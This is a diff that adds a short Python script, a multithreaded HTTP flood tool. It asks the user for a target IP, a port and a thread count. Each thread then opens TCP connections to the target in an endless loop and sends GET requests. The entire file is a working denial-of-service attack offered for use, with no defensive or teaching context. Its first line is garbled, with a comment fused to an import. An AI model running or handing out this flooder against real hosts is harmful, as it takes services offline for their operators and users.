@@ -1,0 +1,23 @@
+# qweasdimport socket
+import threading
+
+def attack(target_ip, target_port):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+            s.close()
+        except Exception as e:
+            print(f"Error: {e}")
+
+if __name__ == "__main__":
+    target = input("Enter target IP: ")
+    port = int(input("Enter target port: "))
+    threads = int(input("Enter number of threads: "))
+    
+    for i in range(threads):
+        thread = threading.Thread(target=attack, args=(target, port))
+        thread.start()
+        print(f"Thread {i+1} started")
